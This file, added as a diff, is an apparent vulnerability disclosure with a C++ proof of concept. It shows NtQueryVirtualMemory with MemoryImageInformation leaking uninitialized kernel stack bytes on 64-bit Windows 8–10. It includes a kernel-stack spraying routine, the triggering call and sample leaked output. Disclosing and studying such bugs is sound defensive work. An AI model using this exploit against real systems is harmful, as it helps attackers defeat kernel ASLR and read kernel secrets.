@@ -1,0 +1,105 @@
+/*
+We have discovered that the nt!NtQueryVirtualMemory system call invoked with the MemoryImageInformation (0x6) information class discloses uninitialized kernel stack memory to user-mode clients. The vulnerability affects 64-bit versions of Windows 8 to 10.
+
+The layout of the corresponding output buffer is unknown to us; however, we have determined that an output size of 24 bytes is accepted. At the end of that memory area, 4 uninitialized bytes from the kernel stack can be leaked to the client application.
+
+The attached proof-of-concept program demonstrates the disclosure by spraying the kernel stack with a large number of 0x41 ('A') marker bytes, and then calling the affected system call with the MemoryImageInformation info class and the allowed output size. An example output is as follows:
+
+--- cut ---
+  Status: 0, Return Length: 18
+  00000000: 00 00 f3 0c f7 7f 00 00 00 20 02 00 00 00 00 00 ......... ......
+  00000010: 00 00 00 00 41 41 41 41 ?? ?? ?? ?? ?? ?? ?? ?? ....AAAA........
+--- cut ---
+
+It is clearly visible here that the 4 trailing bytes copied from ring-0 to ring-3 remained uninitialized. Repeatedly triggering the vulnerability could allow local authenticated attackers to defeat certain exploit mitigations (kernel ASLR) or read other secrets stored in the kernel address space.
+*/
+
+#include <Windows.h>
+#include <winternl.h>
+
+#include <cstdio>
+
+#pragma comment(lib, "ntdll.lib")
+
+#define MemoryImageInformation ((MEMORY_INFORMATION_CLASS)6)
+
+extern "C" {
+  typedef DWORD MEMORY_INFORMATION_CLASS;
+  NTSTATUS NTAPI NtQueryVirtualMemory(
+    _In_      HANDLE                   ProcessHandle,
+    _In_opt_  PVOID                    BaseAddress,
+    _In_      MEMORY_INFORMATION_CLASS MemoryInformationClass,
+    _Out_     PVOID                    MemoryInformation,
+    _In_      SIZE_T                   MemoryInformationLength,
+    _Out_opt_ PSIZE_T                  ReturnLength
+  );
+};
+
+VOID PrintHex(PVOID Buffer, ULONG dwBytes) {
+  PBYTE Data = (PBYTE)Buffer;
+  for (ULONG i = 0; i < dwBytes; i += 16) {
+    printf("%.8x: ", i);
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes) {
+        printf("%.2x ", Data[i + j]);
+      }
+      else {
+        printf("?? ");
+      }
+    }
+
+    for (ULONG j = 0; j < 16; j++) {
+      if (i + j < dwBytes && Data[i + j] >= 0x20 && Data[i + j] <= 0x7e) {
+        printf("%c", Data[i + j]);
+      }
+      else {
+        printf(".");
+      }
+    }
+
+    printf("\n");
+  }
+}
+
+VOID MyMemset(PBYTE ptr, BYTE byte, ULONG size) {
+  for (ULONG i = 0; i < size; i++) {
+    ptr[i] = byte;
+  }
+}
+
+VOID SprayKernelStack() {
+  static bool initialized = false;
+  static HPALETTE(NTAPI *EngCreatePalette)(
+    _In_ ULONG iMode,
+    _In_ ULONG cColors,
+    _In_ ULONG *pulColors,
+    _In_ FLONG flRed,
+    _In_ FLONG flGreen,
+    _In_ FLONG flBlue
+    );
+
+  if (!initialized) {
+    EngCreatePalette = (HPALETTE(NTAPI*)(ULONG, ULONG, ULONG *, FLONG, FLONG, FLONG))GetProcAddress(LoadLibrary(L"gdi32.dll"), "EngCreatePalette");
+    initialized = true;
+  }
+
+  static ULONG buffer[256];
+  MyMemset((PBYTE)buffer, 'A', sizeof(buffer));
+  EngCreatePalette(1, ARRAYSIZE(buffer), buffer, 0, 0, 0);
+  MyMemset((PBYTE)buffer, 'B', sizeof(buffer));
+}
+
+int main() {
+  static BYTE OutputBuffer[1024];
+
+  SprayKernelStack();
+
+  SIZE_T ReturnLength = 0;
+  NTSTATUS Status = NtQueryVirtualMemory(GetCurrentProcess(), GetModuleHandle(NULL), MemoryImageInformation, OutputBuffer, sizeof(OutputBuffer), &ReturnLength);
+
+  printf("Status: %x, Return Length: %x\n", Status, ReturnLength);
+  PrintHex(OutputBuffer, ReturnLength);
+
+  return 0;
+}
